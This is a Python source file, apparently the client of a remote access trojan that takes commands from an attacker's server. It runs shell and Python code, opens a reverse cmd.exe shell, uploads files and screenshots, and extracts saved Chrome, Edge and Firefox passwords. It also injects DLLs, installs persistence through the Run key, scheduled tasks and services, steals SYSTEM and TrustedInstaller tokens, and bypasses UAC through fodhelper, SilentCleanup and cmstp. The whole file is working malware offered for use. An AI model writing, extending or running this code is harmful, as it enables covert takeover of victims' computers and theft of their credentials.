import contextlib
import glob
import importlib.util
import inspect
import io
import json
import os
import socket
import subprocess
import threading
import time

from client.config.config import SERVER_ADDR
from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
from client.util.reflection_util import get_main_class
from common.util import logger, get_time, format_dict, parse, get_size

if os.name == 'nt':
    from client.util.win32util import *

    INTEGRITY_LEVEL = get_integrity_level()
    EXECUTABLE_PATH = get_executable_path()
    LP_APPLICATION_NAME, LP_COMMAND_LINE = get_executable_info()

UP_TIME = get_time()


# noinspection PyMethodMayBeStatic
# noinspection PyUnusedLocal
class CommandExecutor:
    def __init__(self, socket):
        self.socket = socket
        self.command_id = None
        self.imported_modules = {}

    def execute_command(self, command_id, command):
        """
        执行命令
        :param command_id: 命令id，用于set到该实例中，返回结果时指定对应的命令id
        :param command: 命令字符串
        :return: 执行结果元组（状态和消息）
        """
        # 将 command_id 设置为实例变量
        self.command_id = command_id
        # 解析 command 得到函数名和其参数（如果有）
        name, arg = parse(command)
        # 检查实例是否有一个与解析出的函数名相对应的方法
        if hasattr(self, name):
            # 使用函数名获取方法对象
            func = getattr(self, name)
            # 检查方法是否有 'desc' 注解
            if hasattr(func, 'help'):
                # 如果方法接受参数，则带上提供的参数调用它
                if len(inspect.signature(func).parameters):
                    return func(arg)
                # 如果方法不接受参数，则无参数调用
                return func()
            else:
                # 如果方法没有 'desc' 注解，则执行 'shell' 方法并将原始命令作为参数
                return self.shell(command)
        else:
            # 如果不存在与解析出的名字相对应的方法，则执行 'shell' 方法并将原始命令作为参数
            return self.shell(command)

    def read_stream(self, stream):
        """
        从输入流 stream 读取内容，并将每一行通过 send_to_server 方法发送到服务器。

        Parameters:
            stream (file-like object): 用于读取内容的输入流对象。

        Returns:
            None
        """
        while True:
            # 从输入流读取一行数据
            line = stream.readline()
            # 如果没有更多数据可读取，则跳出循环
            if not line:
                break
            # 将读取的字节转换为字符串，并去除行尾的换行符
            self.send_to_server(1, line.decode(locale.getdefaultlocale()[1]).strip('\n'), 0)

    def send_to_server(self, status, result, end):
        self.socket.send_result(self.command_id, status, result, end)

    def get_command_list(self):
        methods = [name for name, method in inspect.getmembers(self, inspect.ismethod) if hasattr(method, 'help')]
        return json.dumps(methods)

    def dynamic_import(self, module):
        # 获取模块路径
        module_dir = os.path.join(get_working_directory(), 'client/util/modules/')
        module_path = os.path.abspath(os.path.join(module_dir, module))

        # 检查文件是否存在
        if not os.path.isfile(module_path):
            raise FileNotFoundError(f'File does not exist: {module_path}')

        module_name, _ = os.path.splitext(os.path.basename(module_path))

        # 导入模块
        spec = importlib.util.spec_from_file_location(module_name, module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        # 获取主类
        cls = get_main_class(module, module_name)

        # 实例化类并设置参数
        instance = cls.get_instance()
        instance.set_args(self.socket, self.command_id)

        # 缓存实例化后的类对象
        self.imported_modules[module_name] = instance
        return instance

    @desc('execute shell command')
    def shell(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
        if stdout:
            return 1, stdout
        elif stderr:
            return 0, stderr
        else:
            return 1, ''

    @desc('execute shell command and read from streams in parallel')
    def read(self, command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout_thread = threading.Thread(target=self.read_stream, args=(cmd.stdout,))
        stderr_thread = threading.Thread(target=self.read_stream, args=(cmd.stderr,))
        stdout_thread.daemon = True
        stderr_thread.daemon = True
        stdout_thread.start()
        stderr_thread.start()
        # 等待命令完成
        cmd.wait()
        time.sleep(0.1)
        self.send_to_server(1, "Command completed successfully", 1)

    @desc('execute shell command without waiting for results')
    def run(self, command):
        if not command:
            return 0, ''
        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
        return 1, 'Process created: {}'.format(p.pid)

    @desc('download file')
    def download(self, filename):
        if os.path.isfile(filename):
            self.socket.send_result(self.command_id, 1, 'Preparing to send file', eof=0)
            self.socket.send_result(self.command_id, 1, 'File length is {}'.format(os.path.getsize(filename)), eof=0)
            self.socket.send_file(self.command_id, filename)
        else:
            return 0, 'File does not exist'

    @desc('execute python code')
    def pyexec(self, code, kwargs=None):
        if kwargs is None:
            kwargs = {}
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, kwargs)
        return 1, f.getvalue()

    @desc('close connection')
    def kill(self):
        self.socket.close()
        sys.exit(0)

    @desc('reset connection')
    def reset(self):
        subprocess.Popen(EXECUTABLE_PATH)
        self.socket.close()
        sys.exit(0)

    @desc('show this help')
    def help(self):
        methods = {name: method for name, method in
                   inspect.getmembers(self, lambda x: inspect.isfunction(x) or inspect.ismethod(x))
                   if hasattr(method, 'help')}
        return 1, format_dict({name: method.help for name, method in methods.items()})

    @desc('change directory')
    def cd(self, path):
        if not path:
            return 1, ''
        if os.path.isdir(path):
            os.chdir(path)
            return 1, ''
        else:
            return 0, 'Cannot find the path specified'

    @desc('execute python code')
    def pyexec(self, code, kwargs=None):
        if kwargs is None:
            kwargs = {}
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, kwargs)
        return 1, f.getvalue()

    @desc('grab a screenshot')
    def screenshot(self):
        self.send_to_server(1, 'Importing module: pyautogui', 0)
        import pyautogui
        self.send_to_server(1, 'Preparing to take a screenshot', 0)
        filename = 'screenshot_{}.png'.format(get_time())
        pyautogui.screenshot(filename)
        self.send_to_server(1, 'Screenshot success', 0)
        self.send_to_server(1, f'Preparing to send file, length is {get_size(os.path.getsize(filename))}', 0)
        self.socket.send_file(self.command_id, filename)
        os.remove(filename)

    @desc('load module and execute in new thread')
    def load(self, arg):
        if not arg.strip():
            modules = []
            module_dir = os.path.join(get_working_directory(), 'client/util/modules/')
            for file in glob.iglob(os.path.join(module_dir, '**/*.py'), recursive=True):
                modules.append(os.path.relpath(file, module_dir).replace('\\', '/'))
            return 1, '\n'.join(modules)
        if not arg.endswith('.py'):
            arg += '.py'
        module_name, _ = os.path.splitext(os.path.basename(arg))
        if module_name == 'module':
            raise Exception(f'Base module not executable')
        if module_name in self.imported_modules and self.imported_modules.get(module_name).status:
            raise Exception(f'The module is already in progress')

        self.send_to_server(1, f'Preparing to import module: {arg}', 0)
        instance = self.dynamic_import(arg)
        if instance:
            self.send_to_server(1,
                                f'Imported successfully, current imported modules: {list(self.imported_modules.keys())}',
                                0)
            self.send_to_server(1, 'New thread being started', 0)
            thread = threading.Thread(target=instance.run)
            thread.start()

            self.send_to_server(1,
                                f'Successfully started the thread with the name {thread.name}\nExecute the command "stop {module_name}" to stop',
                                0)
        else:
            raise Exception(f'Failed to import module: {arg}')

    @desc('stop loaded module')
    def stop(self, arg):
        if arg.endswith('.py'):
            # 使用切片去掉最后的 .py 部分
            arg = arg[:-3]
        if arg in self.imported_modules:
            instance = self.imported_modules.get(arg)
            if instance.status:
                instance.stop()
            self.imported_modules.pop(arg)
            return 1, 'Interrupt signal sent'
        else:
            return 0, 'The module has not been imported'

    @desc('start a interactive reverse shell')
    def revshell(self, arg):
        self.send_to_server(1, 'Reverse shell thread being started', 1)

        p = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

        s = socket.socket()
        s.connect((SERVER_ADDR[0], int(arg.strip())))

        def send():
            while p.poll() is None:
                o = os.read(p.stdout.fileno(), 1024)
                s.send(o)
            logger.info('Sending thread has been terminated')
            s.close()

        def recv():
            try:
                while 1:
                    i = s.recv(1024)
                    os.write(p.stdin.fileno(), i)
            finally:
                logger.info('Receiving thread has been terminated')

        threading.Thread(target=send, daemon=True).start()
        threading.Thread(target=recv).start()

    @desc('get information')
    def getinfo(self):
        import platform
        info = {}
        try:
            info['pid'] = os.getpid()
            info['hostname'] = platform.node()
            info['os'] = platform.platform()
            info['username'] = psutil.Process().username()
            info['integrity'] = INTEGRITY_LEVEL
            info['exec_path'] = EXECUTABLE_PATH
            info['python_ver'] = platform.python_version()
            info['up_time'] = UP_TIME
        except Exception as e:
            logger.error(e)
        finally:
            return 1, format_dict(info)

    @desc('detect user inactive time')
    def idletime(self):
        import win32api
        return 1, 'User has been idle for: {} seconds'.format(
            (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)

    @desc('perform emergency shutdown')
    def poweroff(self):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @desc('create a zip archive')
    def zip(self, dir_name):
        import pathlib
        import shutil
        import tempfile
        tempdir = tempfile.mkdtemp()
        dir_name = os.path.abspath(dir_name)
        if not os.path.isdir(dir_name):
            return 0, f'Directory does not exist: {dir_name}'
        zip_name = os.path.basename(dir_name)
        pardir = pathlib.Path(dir_name).resolve().parent
        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
                                       base_dir=os.path.basename(dir_name))
        return 1, f'Archive created: {filename}'

    @desc('extract files from a zip archive')
    def unzip(self, zip_name):
        import shutil
        zip_name = os.path.abspath(zip_name)
        if not os.path.isfile(zip_name):
            return 0, f'File does not exist: {zip_name}'
        shutil.unpack_archive(zip_name, os.getcwd())
        return 1, f'Archive extracted to {os.getcwd()}'

    @desc('inject DLL into process')
    @params('pid', 'dll_path')
    def inject(self, this, args):
        if not os.path.isfile(this.dll_path):
            return 0, 'File does not exist: {}'.format(this.dll_path)
        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))

    @desc('extract data from browser')
    @params('browser', 'type')
    def browser(self, this, args):
        home = os.path.expanduser('~')
        if this.browser == 'firefox':
            if this.type == 'password':
                profile_path = os.path.join(home, r'AppData\Roaming\Mozilla\Firefox\Profiles')
                return get_firefox_password(profile_path)
            else:
                return 0, 'No supported: {}'.format(this.type)

        profile_paths = {
            'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
            'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
        }
        profile_path = profile_paths.get(this.browser)
        if not profile_path:
            return 0, 'Not supported: {}'.format(this.browser)
        if not os.path.isdir(profile_path):
            return 0, 'Not installed: {}'.format(this.browser)
        local_state = os.path.join(profile_path, 'Local State')
        default = os.path.join(profile_path, r'Default')
        login_data = os.path.join(default, 'Login Data')
        bookmarks = os.path.join(default, 'Bookmarks')
        history = os.path.join(default, 'History')
        if this.type == 'password':
            return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
                                 sort_keys=False,
                                 indent=2,
                                 ensure_ascii=False)
        elif this.type == 'bookmark':
            return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
        elif this.type == 'history':
            return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
        else:
            return 0, 'Error: {}'.format(this.type)

    @desc('apply persistence mechanism')
    @enclosing
    def persist(self, args):

        @desc('create registry key')
        def registry(option):
            import winreg
            if not option:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'rat', 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.CloseKey(key)
                return 1, 'registry key created'
            elif option == '--undo':
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.DeleteValue(key, 'rat')
                winreg.CloseKey(key)
                return 1, 'registry key removed'
            else:
                return 0, 'unknown option: {}'.format(option)

        @desc('schedule task')
        @require_admin
        def schtasks(option):
            if not option:
                return self.shell(
                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
            elif option == '--undo':
                return self.shell('schtasks.exe /delete /tn rat /f')
            else:
                return 0, 'unknown option: {}'.format(option)

        @desc('create service')
        @require_admin
        def service(option):
            if not option:
                return self.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
            elif option == '--undo':
                return self.shell('sc delete rat')
            else:
                return 0, 'unknown option: {}'.format(option)

        return locals()

    @desc('duplicate token from process')
    @enclosing
    def stealtoken(self, args):
        @desc('run as system')
        @require_admin
        def system():
            enable_privilege('SeDebugPrivilege')
            pid = create_process_with_token(duplicate_token(get_process_token(get_pid('winlogon.exe'))),
                                            LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('run as trusted installer')
        @require_integrity('System')
        def ti():
            enable_privilege('SeDebugPrivilege')
            start_service('TrustedInstaller')
            h_token = duplicate_token(get_process_token(get_pid('TrustedInstaller.exe')))
            pid = create_process_with_token(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('bypass session 0 isolation and run as user')
        @require_integrity('System')
        def user():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_user_token())
            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        @desc('bypass session 0 isolation and run as admin')
        @require_integrity('System')
        def admin():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_linked_token(get_user_token()))
            pid = create_process_as_user(h_token, LP_APPLICATION_NAME, LP_COMMAND_LINE)
            return 1, 'Process created: {}'.format(pid)

        return locals()

    @desc('elevate as admin without uac prompt')
    @enclosing
    def uac(self, args):

        @desc('ask for elevation')
        @require_integrity('Medium')
        def ask():
            import win32api
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', LP_APPLICATION_NAME, LP_COMMAND_LINE, None, 1)
            if result > 32:
                return 1, ''
            else:
                return 0, str(result) + ', ' + win32api.FormatMessage(result)

        @desc('trusted binary')
        @require_integrity('Medium')
        def fodhelper():
            import winreg
            reg_path = r'Software\Classes\ms-settings\shell\open\command'
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, EXECUTABLE_PATH)
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
            p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
            p.communicate()
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
            winreg.DeleteValue(key, 'DelegateExecute')
            winreg.CloseKey(key)
            return 1, 'Success'

        @desc('disk cleanup scheduled task')
        @require_integrity('Medium')
        def diskcleanup():
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, EXECUTABLE_PATH + ' ;')
            p = subprocess.Popen(r'schtasks.exe /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /i', shell=True)
            p.communicate()
            winreg.DeleteValue(key, 'windir')
            winreg.CloseKey(key)
            return 1, 'Success'

        @desc('install inf file')
        @require_integrity('Medium')
        def cmstp():
            import tempfile
            inf_path = os.path.join(tempfile.gettempdir(), 'flcVPN.inf')
            with open(inf_path, 'w') as f:
                f.write(inf_template)
            p = subprocess.Popen(r'C:\Windows\System32\cmstp.exe "{}" /au'.format(inf_path))
            time.sleep(1)
            hwnd = ctypes.windll.user32.FindWindowW(None, 'flcVPN')
            if not hwnd:
                raise Exception('unable to detect window')
            if not ctypes.windll.user32.SetForegroundWindow(hwnd):
                raise Exception('unable to activate window')
            if not ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0):
                raise Exception('unable to send keyboard event to window')
            time.sleep(5)
            psutil.Process(p.pid).kill()
            os.remove(inf_path)
            return 1, 'Success'

        return locals()
